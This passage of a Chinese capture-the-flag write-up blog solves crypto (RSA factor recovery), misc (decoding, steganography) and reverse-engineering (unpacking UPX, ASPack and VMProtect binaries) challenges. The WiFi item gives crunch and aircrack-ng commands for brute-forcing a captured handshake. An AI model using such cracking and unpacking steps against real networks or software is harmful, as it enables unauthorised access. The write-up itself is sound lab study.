+<p>而中间的<strong>pq[500:1500]</strong>的前<strong>500</strong>字节含有<strong>a
+* b</strong>的后半部分，后<strong>500</strong>字节含有<strong>a *
+b</strong>的前半部分，做个简单减法可得。</p>
+<p>综上，可得<strong>a * b</strong>和<strong>a ² + b
+²</strong>的值，然后根据高中学的那一套变换可以求得<strong>a</strong>和<strong>b</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(a + b) ² = a ² + 2 * a * b + b ²</span><br><span class="line">(a - b) ² = a ² - 2 * a * b + b ²</span><br></pre></td></tr></table></figure>
+<p>联立公式解得<strong>a+b</strong>和<strong>a-b</strong>的值，再联立二元一次方程求出<strong>a</strong>和<strong>b</strong>，进而求出第一次的<strong>p</strong>和<strong>q</strong>。</p>
+<p>再使用二分法调用<strong>next_prime()</strong>函数求解出第二次的<strong>p</strong>和<strong>q</strong>，最后解得<strong>flag</strong>，脚本如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pq = <span class="number">37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368534492698712183905213300675019880169669159964289135274268951386122314246699412166656323475268623240778461031327966634628420986855022944785421496251349486099392411145566566437986155875600117002222032846697544656901210849382567936904958595228620017066673190455548617917273881089052468844830306632804733848750820391807100094948772492402636422551350516389981409116121666282434777976293668265700614707939438561465158100805697922866599682141928964956895065357677209698826476508887966210560085802544989199042295263908880764987497015388183619829914488242002252489035055312547747792033076017959711401664024465093007341377103124755426567781873434171576297409356302054965976819782564966567852321032108507478998871390301458143582617644492262165902951270805160376459476885522275531457938661136508391452032625051782015102833218959697470722331233350397631435041061401412630047713991858871735035714326218833998760244965866341087147750123869855038366992182962371334384526411144813368418246803652025254206189223834187719880012103660703380187226220860</span></span><br><span class="line">n = <span class="number">37290153165969298170747767487987767106604956327590459309623310884436645867385405226836923826439760402232182199047042298740970941114757402758035338227352981884345194304183079410512904720516197002459598643659802383718137698974557870280366585586392385470235597777672593360788744398375690898546971801388821194234775373952698134335885991694714949974679482564600815766377388895037809222168800554222619940240853717965637149897765149770956991503459995786889995461520332980787566967767243445754450380553166156028030513979079301998632175402072502016282327825403961392784400687386536170117841528456263456021394359662685873080287765689757030352392386374307257266677811647633925457228036341541693812765785784057781251815707260401922647083928541835257244409503393940374048782722357915189148582407507806733352268172024029303953342827905707727300151171157623562387977156106983516547443642151573456682745626175061369310982040554116369983687552560719792717887667637107087090897681039368537631451824008445150593322916621649220131918968381060182780056625981084043051299820111816407714077085179863978735943069017108793879580065214612325438873475463670028900700692331942940752758392673078381358679392924527642317471983718497708036815480999969876652686414859011578133113730930542513696962965675847727315009182439824295556392013537952480748938928408290671107333656277905126915134701713932190005567660746756601077906025437341247344713253422720837604831207936303137369977025954243957891577406266667226864293421045998499026349073973676803568161225217742238807019077558158505566968246373749202724739826733649675118977232613022754175080279658222551375134841038576853604493545070340911086664690452703289923302725433846272032435289554345937247024060157309603467510583043117535674355137280615256893616267247008324272285381171004240649782585733382066689782757882726882857063752626302302445421988032917071576855484653938018800413715950664940531918933498765096986757431159488734247146715664409455285656746712809269599736842704425915921</span></span><br><span class="line">flag = <span class="number">37184996108096167233025618263505757153157343097156888579791591678112798126919291822117280574121886798076450090988956975942694991748710209332101082905159257360206646364269758967180975253962825625943696420172327932961625085719678913462057142665457670366149034781204452807008455874986258694889544297820868505385801547530471600056912582928858038944066247597538813265625994454536879142936629149425871030836276097612443965190900147217177268273320302968487288289500066066413057425060274495415705347775452378126322700828792271046010263910271491830733016822853700053524052302275780619672110356657862368196424416287062999248715568046365255257809392739368556770263662626707604374137827085932252100188620626033333675559976574305831148764403296339508944436482748296238651395448197460974036742794395872850277918173344274773788864080695651830624419146757315446431269176300228703998177892985982388577831521216077129479998846266657008240203501406588349129137285647942569321607846013589344817050392650458477423460119297842938591617558953789224928692831245011187614395138305116091095517452781922364575105441246935183151829079785593965595659385764661764536534314109799011221376335166825363745468702289956019189691732841787948543771767552418889945812912952844388135828118570454948482278617042826378637743128777368607901501702388930246381982139634661483616105908175895785968677045741141086145187314146524800384426347813569795767829229399693985449649456073846347751123890326703399205472967773736717062282465272801543616851680865089979007872017576434756441977097817456958807489726277542047228572876003573562220328683701400744899648300227399574965938796721337143228465728576794734241148236493866791812420360737798058399689694043617192496134725512211166304050577572889549976404923415229865890151512800020112421854251196729060158218415862519607464231622361159436715876677889457900668694738243191441657050304632774189736769141333132873006921328644347784442609254582911864794147017850676177776316795316841373510481580805823659839</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print a * b * pow(10, 1000) + (a * a + b * b) * pow(10, 500) + a * b</span></span><br><span class="line"></span><br><span class="line">a_front = <span class="built_in">str</span>(pq)[:<span class="number">500</span>]</span><br><span class="line">a_after = <span class="built_in">str</span>(pq)[<span class="number">1500</span>:]</span><br><span class="line">a_center = <span class="built_in">str</span>(pq)[<span class="number">500</span>:<span class="number">1500</span>]</span><br><span class="line"><span class="comment"># print a_front, a_center, a_after</span></span><br><span class="line"></span><br><span class="line">a2_b2 = <span class="built_in">int</span>(<span class="string">&quot;1&quot;</span> + a_center) - <span class="built_in">int</span>(a_after + a_front) + <span class="number">1</span></span><br><span class="line">ab = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">int</span>(a_front) - <span class="number">1</span>) + a_after)</span><br><span class="line"><span class="comment"># print a2_b2, ab</span></span><br><span class="line"></span><br><span class="line">a_plus_b = iroot(a2_b2 + <span class="number">2</span> * ab, <span class="number">2</span>)</span><br><span class="line">a_reduce_b = iroot(a2_b2 - <span class="number">2</span> * ab, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># print a_plus_b, a_reduce_b</span></span><br><span class="line"></span><br><span class="line">a_plus_b = <span class="number">125520294471294371756206159368181409945356030402603762503482456202897533387782094536256610499618557722340156388350652825753139764317331244759764232625886315299606875442745587812532678599409403821368176178124423559665940459376956151960208210346359347886654984646062874450883290186056767079719177407287835346204307512502564043099039957758232483284305934705085260831986768250453454694243836141419616105296901321142602722479489972619458888977889921182264113147746483540050001938721542291553506118731266299</span></span><br><span class="line">a_reduce_b = <span class="number">28970382423653526230782087428394120199094608888807510969672174008572263444342743452382065495452410979665183590859836472860381842418270886250846330507167646674351905885014449434182842316793842355041032703945358809543746947830533653096857965009150717206961368552309542092906822247898706652989394172510971441082397663739139074168863166474942514453940979697271097233244125249898829123427276166705668136075753341362350636336479869531538499746880132398933374584887892784910782260556527383469248578187483469</span></span><br><span class="line">a = (a_plus_b + a_reduce_b) // <span class="number">2</span></span><br><span class="line">b = a_plus_b - a</span><br><span class="line">p = a * <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>) + b</span><br><span class="line">q = b * <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>) + a</span><br><span class="line"><span class="comment"># print p, q</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># high = 2 ** 100</span></span><br><span class="line"><span class="comment"># low = 0</span></span><br><span class="line"><span class="comment"># c = (high + low) / 2</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment">#     print c</span></span><br><span class="line"><span class="comment">#     new_p = next_prime(p + c)</span></span><br><span class="line"><span class="comment">#     new_q = next_prime(q + c)</span></span><br><span class="line"><span class="comment">#     if new_p * new_q &lt; n:</span></span><br><span class="line"><span class="comment">#         low = c</span></span><br><span class="line"><span class="comment">#         print &quot;p * q &lt; n&quot;</span></span><br><span class="line"><span class="comment">#     elif new_p * new_q &gt; n:</span></span><br><span class="line"><span class="comment">#         high = c</span></span><br><span class="line"><span class="comment">#         print &quot;p * q &gt; n&quot;</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         print new_p, new_q, c</span></span><br><span class="line"><span class="comment">#         p = new_p</span></span><br><span class="line"><span class="comment">#         q = new_q</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     c = (high + low) / 2</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 250059412706552500264745575936</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">250059412706552500264745575936</span></span><br><span class="line">p = next_prime(c + p)</span><br><span class="line">q = next_prime(c + q)</span><br><span class="line">f = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, f)</span><br><span class="line">flag = <span class="built_in">pow</span>(flag, d, n)</span><br><span class="line"><span class="built_in">print</span> long_to_bytes(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;ddc4205ecd6c22035acae589113bb8aa&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="misc">Misc</h3>
+<h4 id="签到">签到</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9&quot;</span></span><br><span class="line"><span class="built_in">print</span> base64.b64decode(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># please submit: flag&#123;hello_byb&#125;</span></span><br></pre></td></tr></table></figure>
+<h4 id="key">key</h4>
+<p>原题，找到了<a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/hardcoreYutian/p/11581185.html">某邀请赛misc
+key阉割发行版</a>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rgb = [<span class="string">&#x27;2f&#x27;</span>, <span class="string">&#x27;3f&#x27;</span>, <span class="string">&#x27;24&#x27;</span>, <span class="string">&#x27;22&#x27;</span>, <span class="string">&#x27;2e&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;7f&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;24&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;7b&#x27;</span>, <span class="string">&#x27;7e&#x27;</span>, <span class="string">&#x27;27&#x27;</span>, <span class="string">&#x27;72&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;64&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;21&#x27;</span>, <span class="string">&#x27;76&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;0c&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;23&#x27;</span>, <span class="string">&#x27;72&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;16&#x27;</span>, <span class="string">&#x27;7a&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;7b&#x27;</span>, <span class="string">&#x27;32&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;5c&#x27;</span>]</span><br><span class="line">key = <span class="string">&#x27;ISEEU!&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rgb:</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">16</span>) ^ <span class="built_in">ord</span>(key[j]))</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    j %= <span class="number">6</span></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;265a4cd2-b7f1-4d32-9df7-733edfd2a21b&#125;</span></span><br></pre></td></tr></table></figure>
+<h4 id="哈尔的移动城堡">哈尔的移动城堡</h4>
+<p>把<strong>102%</strong>开头的<strong>GNP</strong>改成<strong>PNG</strong>得到一张背景隐有二维码的图。</p>
+<p>后在<strong>PNG</strong>标识符结束后有一个<strong>4B50</strong>开头的幻数，修正为<strong>504B</strong>分离得到压缩包。</p>
+<p>再将<strong>ori.jpg</strong>转灰度图后，以<strong>ori-gray.jpg</strong>对<strong>102%.png</strong>做<strong>SUB</strong>操作得到二维码，二维码得到解压码<strong>1tsEz_b14ndVV4t3rM4k</strong>。</p>
+<p>对压缩包解密，得到两张图，再次<strong>SUB</strong>操作，得到<strong>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</strong>。</p>
+<h4 id="wireless">WireLess</h4>
+<p>打开题目提示<strong>password:6666xxxx</strong>，大概是爆破<strong>wifi</strong>密码。
+<strong>crunch 8 8 -t 6666%%%% &gt;&gt; wifipass.txt</strong>创建字典。
+<strong>aircrack-ng -w wifipasss.txt
+WiFi.pcap</strong>爆破得到<strong>flag{0566668912-f059-448f}</strong>。</p>
+<h3 id="reverse">Reverse</h3>
+<h4 id="shy">shy</h4>
+<p><a
+target="_blank" rel="noopener" href="https://blog.csdn.net/KingZhang2000/article/details/100654580">CTF
+逆向题 shy</a></p>
+<p>首先查壳，丢到<strong>ExeinfoPE</strong>里面看一下，确定是<strong>upx</strong>壳。</p>
+<p>于是丢到<strong>OD</strong>里面进行脱壳处理，由于是压缩壳，跟踪起来比较麻烦，我选择了个偷懒的办法，下一个<strong>api</strong>访问断点</p>
+<p>即：<strong>VirtualProtect</strong>，运行<strong>3</strong>次<strong>F9</strong>后就跑飞了，于是在<strong>2</strong>次运行后，单步跟踪，到<strong>OEP</strong>。</p>
+<p>使用<strong>OD</strong>自带的插件进行脱壳，注意基址和<strong>OEP</strong>的关系，计算好后填入。</p>
+<p>然后点击脱壳，双击发现不能运行。</p>
+<p>这个问题估计是重定向造成，于是修复一下重定向表的数据。</p>
+<p>保存后，再次运行可以正常跑起来了。</p>
+<p>再次用<strong>OD</strong>载入，发现入口地址不是<strong>OEP</strong>。</p>
+<p>按说是已经解密完成了，于是我定位到<strong>OEP【0x1072940</strong>一看究竟。</p>
+<p>确实已经解密，那么为了方便调试，我直接用<strong>OD</strong>改一下入口代码就可以实现了。</p>
+<p>然后把修改完毕的程序，重新保存到文件，由于有重定位会有下图的提示，点击是，然后右键保存一份<strong>dump0.exe</strong>。</p>
+<p><strong>OD</strong>载入<strong>dump0.exe</strong>发现修改成功，可以直接跳转到<strong>OEP</strong>行，然后单步跟踪，到输入后，发现后面的代码是个加密处理的代码，于是丢到<strong>IDA</strong>里面看一下这块对应的反编译代码。</p>
+<p><strong>buf</strong>就是用户输入的字符串，**if (<em>(&amp;v4 + j) !=
+v79[j])<strong>这个就是关键的比较，那么</strong>V79[]<strong>就应该是异或后的结果，也就是</strong>ben<strong>本题的密钥，于是在</strong>OD<strong>中定位值</strong>6ljh,!;:+&amp;p%i</em>a=Sc4#pt*%**。</p>
+<p>接下来就简单了，直接把这个密钥输入，然后再次定位到这块就能得到<strong>flag</strong>了。</p>
+<p>最终得到<strong>flag{cb7670ab-c597-4b17}</strong>。</p>
+<h4 id="md5">md5</h4>
+<p><a
+target="_blank" rel="noopener" href="https://blog.csdn.net/KingZhang2000/article/details/100625560">CTF
+逆向之MD5短爆破</a>。</p>
+<p>首先查壳，丢到<strong>exeinfope</strong>里面一看，发现是<strong>asp</strong>的壳，手工脱壳。</p>
+<p>根据<strong>ESP</strong>定律，<strong>IAT</strong>修复和重定向表修复后，脱壳的程序可以正常运行。</p>
+<p>用<strong>OD</strong>载入后，开始单步跟踪。</p>
+<p>到用户输入界面，我随便输入了字符串<strong>111111111</strong>单步跟入到下图，发现了<strong>flag</strong>字样。</p>
+<p>这个应该是<strong>flag</strong>的头，于是继续跟进，发现确实在核对输入数据与<strong>flag{</strong>比较，这块就过不去了。</p>
+<p>于是果断的从来，输入数据为<strong>flag{111111111</strong>，来到了下图的地方，在<strong>0x16</strong>的位置比较<strong>0x7D</strong>也就是<strong>}</strong>符号。</p>
+<p>由于<strong>C</strong>语言的字符串下标是从<strong>0</strong>开始的，也就是字符串第<strong>23</strong>个字符处必须是<strong>}</strong>。</p>
+<p>于是构造字符串<strong>flag{11111111111111111}</strong>，继续跟进，接下来是在<strong>0x7</strong>、<strong>0xc</strong>、<strong>0x11</strong>处核对字符<strong>-</strong>即<strong>0x2D</strong>。</p>
+<p>字符串就变成了<strong>flag{11-1111-1111-1111}</strong>，继续跟进，发现了一个字符串<strong>c7218260ef2b966ab0454e07c55cf4e9</strong>。</p>
+<p>感觉像是<strong>MD5</strong>，于是解了一下，得到<strong>oh</strong>，结之前的<strong>flag</strong>应该就是<strong>flag{oh-1111-1111-1111}</strong>。</p>
+<p>再结合本题的提示，<strong>md5</strong>段字节爆破，继续爆破得到<strong>flag{oh-aa30-1111-1111}</strong>。</p>
+<p>继续输入后，单步跟进，此时发现一个字符串<strong>YTkxYQ==</strong>，看起来像<strong>base64</strong>编码，于是尝试解码，得到第三组的<strong>flag</strong>值<strong>a91a</strong>。</p>
+<p>想起之前用<strong>od</strong>也看过字符串，于是找到第四组的字符串<strong>NGZicA==</strong>
+，解码为<strong>4fbp</strong>。</p>
+<p>最终得到<strong>flag{oh-aa30-a91a-4fbp}</strong>。</p>
+<h4 id="bwarm">bwarm</h4>
+<p><a
+target="_blank" rel="noopener" href="https://blog.csdn.net/KingZhang2000/article/details/100734483">CTF
+逆向题之 Bwarm</a>。</p>
+<p>首先，还是查壳，没啥说的<strong>vmp2.0.7</strong>。</p>
+<p>下断点开跑，测试到第<strong>5</strong>次跑飞，那么就在第<strong>4</strong>次的时开始候单步跟踪，先跳出<strong>VirtualProtect</strong>函数
+，然后对代码段设置，内存访问断点。</p>
+<p>然后<strong>F9</strong>继续运行，断下来后，在<strong>ESP</strong>的地方跟踪内存数据，找到<strong>SEH</strong>结构化异常的上面<strong>35C</strong>地址那块，下一个硬件写入断点，并取消之前的内存访问断点。</p>
+<p>然后继续<strong>F9</strong>运行，再次断下来，这次再在代码断下内存访问断点，然后多次<strong>F9</strong>运行，注意观察栈帧的变化，快到<strong>SEH</strong>的地方就接近<strong>OEP</strong>了，此时已经跟踪到解压后的代码段，然后进行一下代码分析。</p>
+<p>完成分析后，代码就还原了，然后单步跟踪，发现<strong>OEP</strong>。</p>
+<p>发现<strong>OEP</strong>后，同时我们也注意到栈帧部分被压入了<strong>3</strong>条数据，这个就是<strong>VMP</strong>偷取的代码，我们需要进行还原，于是在当前位置查找一段<strong>0000000000</strong>的内存段。</p>
+<p>然后，对<strong>VMP</strong>偷取的代码进行<strong>patch</strong>。最后跳转到<strong>OEP</strong>也就是<strong>jmp
+012319C9</strong>。</p>
+<p>接着我们把当前的<strong>01231FB5</strong>设置为新的<strong>EIP</strong>，就可以进行<strong>dump</strong>内存操作了，填好起始地址和入口地址后，点击脱壳。</p>
+<p>把脱壳的文件保存<strong>dump.exe</strong>，然后尝试运行，发现不能运行，直接崩溃掉了。</p>
+<p>于是猜到可能是重定向表的问题造成，用<strong>PE</strong>编辑器修改一下，然后保存，就可以载入<strong>OD</strong>进行动态分析了。</p>
+<p>单步跟踪到完成字符串输入后，发现一个<strong>base64</strong>的字符串<strong>dQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw</strong>。</p>
+<p>还有一个字典，<strong>0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz</strong>。</p>
+<p>那么就是<strong>base64</strong>换字典。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;dQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw&quot;</span></span><br><span class="line">base64_table = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, ]</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    res += base64_table[dic.index(i)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> base64.b64decode(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;e38b5b63-4bf7-4ee8-b422-83f599fe0c43&#125;</span></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/Misc/" rel="tag"><i class="fa fa-tag"></i> Misc</a>
+              <a href="/tags/Reserve/" rel="tag"><i class="fa fa-tag"></i> Reserve</a>
+              <a href="/tags/Crypto/" rel="tag"><i class="fa fa-tag"></i> Crypto</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019-HXB-Preliminary/" rel="prev" title="2019 湖湘杯 线上初赛 部分题解">
+                  <i class="fa fa-chevron-left"></i> 2019 湖湘杯 线上初赛 部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019-EIS/" rel="next" title="2019 高校网络信息安全管理运维挑战赛 部分题解">
+                  2019 高校网络信息安全管理运维挑战赛 部分题解 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
